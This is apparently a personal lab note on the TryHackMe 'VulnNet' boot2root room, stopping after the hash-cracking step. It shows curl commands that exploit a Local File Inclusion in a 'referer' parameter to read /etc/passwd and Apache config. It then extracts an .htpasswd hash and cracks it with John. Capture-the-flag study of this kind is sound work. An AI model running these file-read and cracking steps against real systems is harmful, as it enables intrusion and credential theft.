
2025-01-30 22:44

Source: #Boot2root

After adding the IP to `/etc/hosts`, we do some directory busting which leads us nowhere so we [[crawling a website]] to find links 

Checking the source code of the main page reveals 2 JavaScript imports at the end of the code
- The analysis of the first script will reveal the following subdomain - `http://broadcast.vulnnet.thm`
- The second script reveals that `index.php` accepts a `referer` parameter - `http://vulnnet.thm/index.php?referer=`
#### LFI 

Browsing this new subdomain prompts for a basic authentication, which is a dead end at this stage. Let’s check the other information.

Injecting `/etc/password` as `referer` confirms that the page suffers from a Local File Inclusion ([[LFI]])
```sh
curl -s http://vulnnet.thm/?referer=/etc/passwd
```

Let’s check in the Apache configuration files 
```sh
curl -s http://vulnnet.thm/?referer=/etc/apache2/sites-enabled/000-default.conf
```

from the above command we get to know that the password file is located in  `/etc/apache2/.htpasswd`
```
developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
```

the username is developers and the `md5crypt` hash is to the right
use to john to crack the hash 
```sh
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```




### References
[TryHackMe | VulnNet](https://tryhackme.com/r/room/vulnnet1)

walktrough
[TryHackMe-VulnNet - aldeid](https://www.aldeid.com/wiki/TryHackMe-VulnNet)
[VulnNet Tryhackme Writeup. By Shamsher khan This is a Writeup of… | by Shamsher khan | InfoSec Write-ups](https://infosecwriteups.com/vulnnet-tryhackme-writeup-3a5bd68b0959)
[TryHackMe — Vulnnet WriteUp/Walkthrough | by Arnav singh | Medium](https://medium.com/@arnavsinghinfosec/tryhackme-vulnnet-writeup-walkthrough-3b7846b24416)